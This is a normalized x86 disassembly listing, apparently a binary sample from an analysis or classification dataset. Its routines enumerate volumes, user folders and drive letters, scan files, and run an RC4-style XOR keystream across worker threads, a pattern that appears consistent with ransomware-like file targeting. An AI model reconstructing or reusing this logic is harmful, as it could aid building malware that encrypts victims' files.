add eax 0x14
call sub_40cb2c
mov eax [ ebp - 0x10 ]
push esi
push 0xd
pop edi
mov [ esi + 0x9 ] ebx
call sub_40cb2c
mov ebx [ ebp + 0x8 ]
jmp r-xdata
mov [ esi + 0x4 ] 0x6
jbe r-xdata
cmp al 0x8
jbe r-xdata
jmp r-xdata
sub_41283b
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
test ecx ecx
je r-xdata
xor al al
test edi edi
je r-xdata
test edx edx
je r-xdata
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] al
mov [ ebp - 0xb ] edi
cmp al 0x1
jbe r-xdata
mov eax [ edx ]
mov [ ebp - 0x7 ] eax
cmp al 0x4
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
mov esi [ ebx + 0x18 ]
push edx
lea eax [ ebx + 0x14 ]
call sub_40cb2c
mov [ ebp - 0x7 ] esi
jmp r-xdata
cmp al 0x5
jbe r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0xd
lea eax [ ebx + 0x4 ]
pop edi
call sub_40cb2c
mov al 0x1
jmp r-xdata
sub_41289d
mov eax sub_41abac
call sub_416a8c
sub esp 0x14
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] edi
mov esi ebx
call sub_40c90c
push 0xffffffff
push ebx
call sub_40cce2
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
xor edx edx
push 0xd
pop ecx
div ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] edi
push [ ebp - 0x14 ]
push ebx
call sub_40cccc
mov eax [ ebx + 0x4 ]
add eax 0x4
push eax
push ebx
call sub_40cccc
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
imul esi esi 0xd
add esi eax
mov eax [ ebx + 0x4 ]
add eax 0x4
push eax
push ebx
call sub_40cccc
push esi
push 0xd
pop edi
mov eax ebx
call sub_40cb2c
inc [ ebp - 0x14 ]
mov al [ esi + 0x4 ]
cmp al 0x1
jbe r-xdata
inc [ ebp - 0x18 ]
jmp r-xdata
cmp al 0x4
jbe r-xdata
mov esi [ ebp - 0x18 ]
cmp esi [ ebp - 0x1c ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov ecx [ esi + 0x9 ]
add ecx eax
push ecx
mov edi [ esi + 0x5 ]
mov eax ebx
call sub_40cb2c
jmp r-xdata
cmp al 0x5
je r-xdata
mov edi [ esi + 0x9 ]
mov [ ebp - 0x20 ] edi
test edi edi
je r-xdata
jbe r-xdata
dec [ ebp - 0x14 ]
push [ esi + 0x5 ]
push edi
call [ IsBadReadPtr@IAT ]
push edi
test eax eax
je r-xdata
cmp al 0x8
jbe r-xdata
mov edi [ esi + 0x5 ]
mov eax ebx
call sub_40cb2c
push [ ebp - 0x20 ]
jmp r-xdata
dec [ ebp - 0x14 ]
call sub_402678
pop ecx
jmp r-xdata
sub_4129da
push ebp
mov ebp esp
sub esp 0x14
push ebx
push edi
test eax eax
je r-xdata
xor al al
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ebx [ esi + 0x18 ]
push 0x8
pop edi
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
lea eax [ esi + 0x14 ]
mov [ ebp - 0xc ] 0x4
mov [ ebp - 0xb ] edi
call sub_40cb2c
lea eax [ ebp - 0x10 ]
push eax
push 0xd
lea eax [ esi + 0x4 ]
pop edi
mov [ ebp - 0x7 ] ebx
call sub_40cb2c
mov al 0x1
jmp r-xdata
pop edi
pop ebx
leave
retn 0x4
sub_412a25
push ebp
mov ebp esp
sub esp 0x10
push edi
test ecx ecx
je r-xdata
xor al al
test eax eax
je r-xdata
mov eax [ eax ]
mov [ ebp - 0x7 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push 0xd
add eax 0x4
pop edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0xb ] 0x4
call sub_40cb2c
mov al 0x1
jmp r-xdata
pop edi
leave
retn 0x4
sub_412a86
mov eax sub_41a972
call sub_416a8c
test [ rw-data ] 0x1
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
or [ rw-data ] 0x1
and [ ebp - 0x4 ] 0x0
push rw-data
call [ InitializeCriticalSection@IAT ]
or [ ebp - 0x4 ] 0xffffffff
sub_412abf
mov eax [ esp + 0x4 ]
push r--data
add eax 0x24
push eax
call sub_40e7e3
test al al
je r-xdata
xor al al
retn
mov eax [ esp + 0x8 ]
mov [ eax + 0x4 ] 0x1
mov al 0x1
retn
sub_412ae3
mov eax sub_41aa0d
call sub_416a8c
sub esp 0x35c
cmp [ edi + 0x58c0 ] 0xffffffff
push ebx
push esi
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ edi + 0x58c0 ]
call sub_412a86
push rw-data
call [ EnterCriticalSection@IAT ]
xor esi esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x34 ]
push eax
push sub_412abf
mov [ edi + 0x58c0 ] esi
call sub_40e1b3
mov ebx 0x104
push ebx
lea eax [ ebp - 0x364 ]
push eax
mov [ ebp - 0x11 ] 0x0
call [ FindFirstVolumeW@IAT ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x2c ] esi
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x2c ]
shrd eax esi 0x14
xor ebx ebx
shr esi 0x14
inc ebx
test esi esi
ja r-xdata
xor eax eax
push eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x364 ]
push eax
call [ GetDiskFreeSpaceExW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
jb r-xdata
push ebx
lea eax [ ebp - 0x364 ]
push eax
push [ ebp - 0x18 ]
call [ FindNextVolumeW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x24 ]
add [ ebp - 0x2c ] eax
adc esi [ ebp - 0x20 ]
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebp - 0x11 ] bl
cmp eax 0x4000
jae r-xdata
push [ ebp - 0x18 ]
call [ FindVolumeClose@IAT ]
mov eax rw-data
call sub_41030a
jmp r-xdata
mov ecx 0x11c
mov edx ecx
lea eax [ ebp - 0x15c ]
mov eax 0x309
mov [ edi + 0x58c0 ] eax
mov esi eax
push r--data
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov esi [ GetVersionExW@IAT ]
lea eax [ ebp - 0x15c ]
push eax
mov [ ebp - 0x15c ] ecx
call esi
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp [ ebp - 0x14c ] ebx
jbe r-xdata
lea eax [ ebp - 0x15c ]
push eax
mov [ ebp - 0x15c ] 0x114
call esi
test eax eax
jne r-xdata
and [ edi + 0x58c0 ] 0x0
push 0x2
pop eax
cmp [ ebp - 0x14c ] eax
jne r-xdata
xor esi esi
mov [ edi + 0x58c0 ] esi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
cmp [ ebp - 0x158 ] 0x6
jbe r-xdata
or [ ebp - 0x4 ] 0xffffffff
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax esi
jmp r-xdata
jne r-xdata
mov [ edi + 0x58c0 ] 0x5
jmp r-xdata
cmp [ ebp - 0x158 ] 0x5
jne r-xdata
cmp [ ebp - 0x154 ] ebx
jae r-xdata
cmp [ ebp - 0x154 ] eax
jne r-xdata
cmp [ ebp - 0x154 ] 0x0
jne r-xdata
cmp [ ebp - 0x154 ] ebx
je r-xdata
mov [ edi + 0x58c0 ] eax
jmp r-xdata
mov [ edi + 0x58c0 ] 0x3
jmp r-xdata
cmp [ ebp - 0x154 ] 0x0
jne r-xdata
mov [ edi + 0x58c0 ] ebx
jmp r-xdata
sub_412d05
push ebx
xor ebx ebx
cmp [ esp + 0x8 ] ebx
je r-xdata
pop ebx
retn 0x4
cmp [ rw-data ] ebx
jne r-xdata
push ebx
call [ SetLastError@IAT ]
push [ esp + 0x8 ]
push ebx
push [ rw-data ]
call [ HeapFree@IAT ]
push ebx
push [ rw-data ]
call [ HeapCompact@IAT ]
call sub_401270
cmp al bl
je r-xdata
sub_412d48
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x6400000
jle r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn 0x8
push esi
push 0x0
call [ SetLastError@IAT ]
push [ ebp + 0xc ]
mov esi [ HeapReAlloc@IAT ]
push [ ebp + 0x8 ]
push 0x18
push [ rw-data ]
call esi
test eax eax
jne r-xdata
call sub_401270
test al al
je r-xdata
pop esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x8
push [ rw-data ]
call esi
sub_412da8
push esi
mov esi eax
cmp esi 0x6400000
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
add esi 0x4
cmp [ rw-data ] 0x0
jne r-xdata
inc esi
push 0x0
call [ SetLastError@IAT ]
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
call sub_401270
test al al
je r-xdata
pop esi
retn
push eax
call [ ExitProcess@IAT ]
sub_412df3
test ebx ebx
jne r-xdata
push esi
push edi
lea esi [ ecx + 0x4e80 ]
push ebx
call sub_401000
mov edi eax
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
push [ esp + 0xc ]
push edi
call [ GetProcAddress@IAT ]
push ebx
call [ LoadLibraryW@IAT ]
mov edi eax
test edi edi
je r-xdata
retn 0x4
xor eax eax
jmp r-xdata
push ebx
call sub_40105e
pop edi
pop esi
sub_412e36
mov eax sub_41a9b0
call sub_416a8c
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40eb63
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
imul ecx ecx 0x14
lea edx [ esi + 0xc ]
push edx
push [ esi + 0x8 ]
push eax
call [ ecx + eax + 0x284 ]
add esp 0xc
mov [ esi + 0x10 ] al
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_412e98
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi ecx
mov ecx [ eax ]
push edi
lea edx [ esi + 0xc ]
mov [ ebp - 0xc ] ecx
call sub_40fb59
test al al
je r-xdata
xor al al
cmp [ esi + 0x8 ] ecx
jb r-xdata
push esi
lea edi [ ebp - 0xc ]
call sub_40fc5f
mov esi eax
pop ecx
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ ebx + 0x2b78 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ ebx + 0x4e7c ] 0x0
jle r-xdata
mov [ ebp - 0x8 ] 0xfffff67c
sub [ ebp - 0x8 ] ebx
lea edi [ ebx + 0x984 ]
pop edi
pop esi
leave
retn
mov [ ebx + 0x5780 ] 0x0
mov eax [ esi + 0x18 ]
cmp eax 0xff00aaee
je r-xdata
mov [ ebp - 0x8 ] 0xffffd378
sub [ ebp - 0x8 ] ebx
lea edi [ ebx + 0x2c88 ]
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x118
cmp eax [ ebx + 0x2b78 ]
jl r-xdata
mov eax [ rw-data ]
cmp eax [ esi + 0x20 ]
je r-xdata
push [ ebx + 0x5778 ]
call sub_412d05
mov eax [ esi + 0x24 ]
call sub_412da8
mov [ ebx + 0x5778 ] eax
test eax eax
je r-xdata
cmp eax 0xff00bb00
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x118
cmp eax [ ebx + 0x4e7c ]
jl r-xdata
mov eax [ rw-data ]
cmp eax [ esi + 0x20 ]
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax [ edi - 0x108 ]
jne r-xdata
mov eax [ edi ]
test eax eax
jle r-xdata
mov ecx [ esi + 0x24 ]
push ecx
mov [ ebx + 0x577c ] ecx
lea ecx [ esi + 0x36 ]
push ecx
push eax
call sub_401f50
add esp 0xc
mov [ ebx + 0x5780 ] 0x1
mov eax [ esi + 0x18 ]
cmp eax [ edi - 0x108 ]
jne r-xdata
mov eax [ edi ]
test eax eax
jle r-xdata
mov eax [ esi + 0x24 ]
call sub_412da8
mov edx [ edi ]
mov ecx [ ebp - 0x8 ]
add ecx edi
shl edx 0x4
add edx ecx
mov [ edx + ebx + 0x884 ] eax
mov eax [ edi ]
shl eax 0x4
add eax ecx
cmp [ eax + ebx + 0x884 ] 0x0
je r-xdata
cmp eax 0x10
jl r-xdata
mov eax [ esi + 0x24 ]
call sub_412da8
mov edx [ edi ]
mov ecx [ ebp - 0x8 ]
add ecx edi
shl edx 0x4
add edx ecx
mov [ edx + ebx + 0x2b88 ] eax
mov eax [ edi ]
shl eax 0x4
add eax ecx
cmp [ eax + ebx + 0x2b88 ] 0x0
je r-xdata
cmp eax 0x10
jl r-xdata
mov edx [ esi + 0x24 ]
mov [ eax + ebx + 0x888 ] edx
mov eax [ edi ]
mov edx [ esi + 0x20 ]
shl eax 0x4
add eax ecx
mov [ eax + ebx + 0x88c ] edx
mov eax [ esi + 0x20 ]
push [ esi + 0x24 ]
mov [ rw-data ] eax
lea eax [ esi + 0x36 ]
push eax
mov eax [ edi ]
shl eax 0x4
add eax ecx
push [ eax + ebx + 0x884 ]
call sub_401f50
add esp 0xc
inc [ edi ]
and [ edi ] 0x0
mov edx [ esi + 0x24 ]
mov [ eax + ebx + 0x2b8c ] edx
mov eax [ edi ]
mov edx [ esi + 0x20 ]
add eax 0x2b9
shl eax 0x4
add eax ecx
mov [ eax + ebx ] edx
mov eax [ esi + 0x20 ]
push [ esi + 0x24 ]
mov [ rw-data ] eax
lea eax [ esi + 0x36 ]
push eax
mov eax [ edi ]
shl eax 0x4
add eax ecx
push [ eax + ebx + 0x2b88 ]
call sub_401f50
add esp 0xc
inc [ edi ]
and [ edi ] 0x0
sub_4130d5
mov eax sub_41aa5b
call sub_416a8c
sub esp 0x38
push ebx
push esi
push edi
lea esi [ ebp - 0x2c ]
mov ebx ecx
call sub_40c9fb
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
mov eax [ ebp + 0x14 ]
mov [ eax ] esi
cmp [ ebx + 0x504 ] esi
jne r-xdata
lea eax [ ebx + 0x5720 ]
mov [ ebp - 0x14 ] eax
cmp eax esi
je r-xdata
xor bl bl
xor al al
push eax
call sub_40ce2a
jmp r-xdata
call sub_40e9bf
sub eax [ ebx + 0x5774 ]
mov [ ebp - 0x1c ] eax
cmp eax 0x2a30
jb r-xdata
test al al
je r-xdata
xor edi edi
mov edx 0x118
cmp [ ebx + 0x2b78 ] esi
jle r-xdata
call sub_40e9bf
push 0x1
push 0x200000
lea esi [ ebp - 0x2c ]
mov [ ebx + 0x5774 ] eax
call sub_40c865
mov edi [ ebp - 0x28 ]
mov esi [ ebx + 0x508 ]
mov [ ebp - 0x18 ] edi
xor edi edi
cmp [ ebx + 0x4e7c ] esi
jle r-xdata
lea eax [ ebx + 0x984 ]
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x1c ]
push eax
push ecx
lea eax [ ebp - 0x40 ]
push eax
push sub_412e36
push 0x10000
push ecx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] cl
call [ CreateThread@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0xff00aaee
jne r-xdata
lea eax [ ebx + 0x2c88 ]
inc edi
add eax edx
cmp edi [ ebx + 0x2b78 ]
jl r-xdata
mov ecx [ eax ]
cmp ecx esi
jle r-xdata
cmp [ ebp - 0x30 ] 0x0
mov edi [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edi
jne r-xdata
mov eax esi
imul eax eax 0x14
push [ eax + ebx + 0x290 ]
push edi
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
cmp [ ebp + 0x8 ] 0xff00bb00
jne r-xdata
cmp [ ebx + 0x5780 ] 0x0
je r-xdata
inc edi
add eax edx
cmp edi [ ebx + 0x4e7c ]
jl r-xdata
mov ecx [ eax ]
cmp ecx esi
jle r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax - 0x108 ]
jne r-xdata
cmp ecx 0x10
jl r-xdata
mov [ ebx + 0x508 ] esi
test edi edi
jle r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
div [ ebx + 0x504 ]
mov esi edx
cmp esi [ ebx + 0x508 ]
jne r-xdata
lea eax [ esi + 0x21 ]
imul eax eax 0x14
inc [ eax + ebx ]
push 0x0
push edi
call [ TerminateThread@IAT ]
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
cmp [ ebx + 0x5780 ] 0x0
je r-xdata
lea eax [ ebx + 0x5778 ]
mov ecx [ eax ]
cmp ecx esi
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax - 0x108 ]
jne r-xdata
cmp ecx 0x10
jl r-xdata
mov edx [ ebp + 0x10 ]
imul edi edi 0x118
lea esi [ edi + ebx ]
lea ecx [ esi + 0x884 ]
mov eax [ ecx ]
mov [ edx ] eax
mov eax [ esi + 0x888 ]
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax [ esi + 0x88c ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
dec [ esi + 0x984 ]
mov eax [ esi + 0x984 ]
shl eax 0x4
push eax
lea eax [ esi + 0x894 ]
push eax
push ecx
call sub_401f50
mov ecx [ esi + 0x984 ]
shl ecx 0x4
add ecx edi
xor eax eax
mov [ ecx + ebx + 0x884 ] eax
mov ecx [ esi + 0x984 ]
shl ecx 0x4
add ecx edi
mov [ ecx + ebx + 0x888 ] eax
mov ecx [ esi + 0x984 ]
shl ecx 0x4
add esp 0xc
add ecx edi
mov [ ecx + ebx + 0x88c ] eax
mov [ esi + 0x890 ] 0x1
and [ ebx + 0x58b8 ] 0x0
call sub_40e9bf
push edi
push [ ebp - 0x2c ]
mov [ ebx + 0x5774 ] eax
call sub_4135c2
mov ecx [ ebp - 0x2c ]
lea eax [ ebp - 0x18 ]
call sub_412e98
push 0x14
pop ecx
lea eax [ ebp - 0x40 ]
inc [ ebx + 0x58b8 ]
jmp r-xdata
push edi
call [ CloseHandle@IAT ]
push [ ebp - 0x14 ]
call sub_40ce0a
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
mov edx [ ebp + 0x14 ]
add ebx 0x577c
mov ecx [ ebx ]
cmp [ ebp - 0x14 ] esi
mov [ edx ] ecx
mov [ eax ] esi
mov [ ebx ] esi
jmp r-xdata
mov edx [ ebp + 0x10 ]
imul edi edi 0x118
lea esi [ edi + ebx ]
lea ecx [ esi + 0x2b88 ]
mov eax [ ecx ]
mov [ edx ] eax
mov eax [ esi + 0x2b8c ]
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax [ esi + 0x2b90 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
dec [ esi + 0x2c88 ]
mov eax [ esi + 0x2c88 ]
shl eax 0x4
push eax
lea eax [ esi + 0x2b98 ]
push eax
push ecx
call sub_401f50
mov ecx [ esi + 0x2c88 ]
shl ecx 0x4
add ecx edi
xor eax eax
mov [ ecx + ebx + 0x2b88 ] eax
mov ecx [ esi + 0x2c88 ]
shl ecx 0x4
add ecx edi
mov [ ecx + ebx + 0x2b8c ] eax
mov ecx [ esi + 0x2c88 ]
add ecx 0x2b9
shl ecx 0x4
add esp 0xc
add ecx edi
mov [ ecx + ebx ] eax
jmp r-xdata
mov bl 0x1
jmp r-xdata
push [ ebp - 0x14 ]
call sub_40ce0a
xor esi esi
je r-xdata
cmp [ ebp - 0x14 ] eax
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x2c ]
call sub_40c938
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_413461
push ebp
lea ebp [ esp - 0x70 ]
sub esp 0x104
cmp [ ebp + 0x7c ] 0x1
jg r-xdata
push ebx
push esi
xor ecx ecx
push edi
mov [ ebp + 0x6e ] cl
xor eax eax
mov edi 0x100
xor al al
jmp r-xdata
mov [ ebp + eax - 0x92 ] al
inc eax
cmp eax edi
jl r-xdata
mov [ ebp - 0x94 ] cx
xor esi esi
add ebp 0x70
leave
retn 0x8
mov [ ebp - 0x93 ] cl
mov dl [ eax ]
movzx ecx cl
lea ecx [ ebp + ecx - 0x92 ]
mov bl [ ecx ]
mov [ eax ] bl
mov [ ecx ] dl
movzx eax [ ebp - 0x94 ]
inc eax
and eax 0x8000001f
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
inc esi
mov [ ebp - 0x94 ] al
cmp esi edi
jl r-xdata
dec eax
or eax 0xffffffe0
inc eax
movzx ecx [ ebp - 0x94 ]
movzx ecx [ ecx + rw-data ]
lea eax [ ebp + esi - 0x92 ]
movzx edx [ eax ]
add ecx edx
movzx edx [ ebp - 0x93 ]
add ecx edx
and ecx 0x800000ff
jns r-xdata
xor edi edi
mov [ ebp + 0x6e ] 0x1
cmp [ ebp + 0x7c ] edi
jle r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
movzx esi [ ebp - 0x93 ]
movzx eax al
mov [ ebp - 0x94 ] al
movzx eax al
lea eax [ ebp + eax - 0x92 ]
movzx ecx [ eax ]
add ecx esi
and ecx 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
mov [ ebp - 0x93 ] cl
mov dl [ eax ]
movzx ecx cl
lea ecx [ ebp + ecx - 0x92 ]
mov bl [ ecx ]
mov [ eax ] bl
mov [ ecx ] dl
movzx esi [ ebp - 0x93 ]
movzx eax [ ebp - 0x94 ]
movzx edx [ ebp + esi - 0x92 ]
movzx ebx [ ebp + eax - 0x92 ]
mov ecx [ ebp + 0x78 ]
add edx ebx
and edx 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
movzx edx dl
mov dl [ ebp + edx - 0x92 ]
xor [ ecx + edi ] dl
inc edi
cmp edi [ ebp + 0x7c ]
jl r-xdata
dec edx
or edx 0xffffff00
inc edx
inc eax
and eax 0x800000ff
jns r-xdata
sub_4135f5
push ecx
call sub_40f29b
push rw-data
push r--data
call sub_401961
call sub_40f29b
push rw-data
push r--data
call sub_401961
call sub_40f29b
push rw-data
push r--data
call sub_401961
pop ecx
retn
sub_41364d
mov eax sub_41abc7
call sub_416a8c
sub esp 0xc
push ebx
push esi
push edi
xor bl bl
call sub_40f29b
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_40165e
pop ecx
pop ecx
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
mov bl 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x4 ]
shr edi 0x2
xor esi esi
test edi edi
jle r-xdata
sub esp 0x10
mov esi esp
mov edi rw-data
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
call sub_40c9ad
mov [ ebp - 0x4 ] 0x1
push ebx
or [ ebp - 0x4 ] 0xffffffff
call sub_4015e6
add esp 0x14
test al al
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push ebx
push [ eax + esi * 4 ]
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
push ebx
push [ rw-data ]
call sub_40cce2
call sub_40f29b
push ebx
call sub_412d05
jmp r-xdata
inc esi
cmp esi edi
jl r-xdata
sub_413701
mov eax sub_41acdb
call sub_416a8c
sub esp 0x468
push ebx
push esi
push edi
lea esi [ ebp - 0x30 ]
call sub_40c9fb
mov [ ebp - 0x4 ] 0x1
call sub_40f29b
mov eax esi
push eax
push r--data
call sub_401961
mov esi [ ebp - 0x2c ]
xor ebx ebx
shr esi 0x2
mov [ ebp - 0x14 ] ebx
cmp esi ebx
jle r-xdata
mov esi [ SHGetFolderPathW@IAT ]
lea eax [ ebp - 0x26c ]
push eax
push ebx
push ebx
push 0x8
push ebx
call esi
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
push 0x104
lea eax [ ebp - 0x474 ]
push eax
mov eax [ ebp - 0x30 ]
push [ eax + ecx * 4 ]
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x26c ]
push eax
push ebx
push ebx
push 0x1c
push ebx
call esi
test eax eax
jne r-xdata
lea edi [ ebp - 0x26c ]
call sub_413634
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] esi
jl r-xdata
call sub_40f29b
lea edi [ ebp - 0x474 ]
call sub_40e7b9
push eax
push [ rw-data ]
call sub_40cce2
lea eax [ ebp - 0x26c ]
push eax
push ebx
push ebx
push 0x5
push ebx
call esi
test eax eax
jne r-xdata
lea edi [ ebp - 0x26c ]
call sub_413634
lea eax [ ebp - 0x26c ]
push eax
push ebx
push ebx
push 0x10
push ebx
call esi
test eax eax
jne r-xdata
lea edi [ ebp - 0x26c ]
call sub_413634
lea eax [ ebp - 0x26c ]
push eax
push ebx
push ebx
push 0x2e
push ebx
call esi
test eax eax
jne r-xdata
lea edi [ ebp - 0x26c ]
call sub_413634
lea eax [ ebp - 0x26c ]
push eax
push ebx
push ebx
push 0x19
push ebx
call esi
test eax eax
jne r-xdata
lea edi [ ebp - 0x26c ]
call sub_413634
mov eax [ r--data ]
mov [ ebp - 0x20 ] eax
mov eax [ r--data ]
mov [ ebp - 0x1c ] eax
xor eax eax
lea edi [ ebp - 0x18 ]
stosw [ edi ]
push 0xc
pop ecx
mov esi r--data
lea edi [ ebp - 0x64 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea edi [ ebp - 0x26c ]
call sub_413634
mov ax [ ebp + ebx * 2 - 0x64 ]
mov [ ebp - 0x20 ] ax
call sub_40f29b
lea edi [ ebp - 0x20 ]
call sub_40e7b9
push eax
push [ rw-data ]
call sub_40cce2
inc ebx
cmp ebx 0x18
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x30 ]
call sub_40c938
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_4138a4
mov eax sub_41acf6
call sub_416a8c
sub esp 0x214
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x220 ]
push eax
mov edi ecx
call [ lstrcpyW@IAT ]
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x220 ]
push eax
call esi
lea ebx [ edi + 0x2c ]
push ebx
lea eax [ ebp - 0x220 ]
push eax
call esi
test [ edi ] 0x10
jne r-xdata
mov esi [ lstrcmpW@IAT ]
push r--data
push ebx
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
call sub_41364d
pop ecx
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push r--data
push ebx
call esi
test eax eax
je r-xdata
call sub_40f29b
call sub_40e9bf
mov esi eax
sub eax [ rw-data ]
cmp eax 0x12c
jbe r-xdata
call sub_40f29b
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
mov ecx edi
call sub_40183c
pop ecx
pop ecx
test al al
je r-xdata
sub esp 0x10
mov esi esp
mov edi rw-data
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
call sub_40c9ad
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x220 ]
push eax
or [ ebp - 0x4 ] 0xffffffff
call sub_4015e6
add esp 0x14
test al al
jne r-xdata
mov ecx [ rw-data ]
mov edx rw-data
call sub_40c257
mov [ rw-data ] esi
jmp r-xdata
push 0x0
push edi
lea eax [ ebp - 0x220 ]
push eax
push 0x70243102
push 0x70243101
call sub_40f29b
push eax
call sub_40ded2
test al al
je r-xdata
call sub_40f29b
lea edi [ ebp - 0x220 ]
call sub_40e7b9
push eax
push [ rw-data ]
call sub_40cce2
call sub_40f29b
mov ebx [ ebp - 0x10 ]
mov eax rw-data
call sub_410115
mov esi [ Sleep@IAT ]
push 0xa
call esi
push 0x0
call esi
mov eax [ rw-data ]
add eax [ edi + 0x20 ]
inc [ rw-data ]
cmp [ rw-data ] 0x1b58
